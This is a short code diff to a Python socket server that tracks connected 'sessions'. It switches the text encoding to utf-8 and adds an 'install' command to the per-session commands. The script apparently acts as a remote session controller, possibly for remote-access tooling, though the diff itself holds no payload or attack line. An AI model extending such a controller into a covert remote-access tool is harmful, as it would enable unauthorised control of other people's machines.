@@ -10,7 +10,7 @@ PORT = 420
 # -------------don't change anything from here if you don't know what you are doing-------------
 BUFFER = 1024
 ADDR = (HOST, PORT)
-FORMAT = "cp850"
+FORMAT = "utf-8"
 DISCONNECT = "!dsc"
 
 server = s.socket(s.AF_INET, s.SOCK_STREAM)
@@ -20,7 +20,7 @@ sessions = {}
 session_ids = []
 
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree"]
+SESSION_COMMANDS = ["help", "back", "tree", "install"]
 
 
 class Commands:
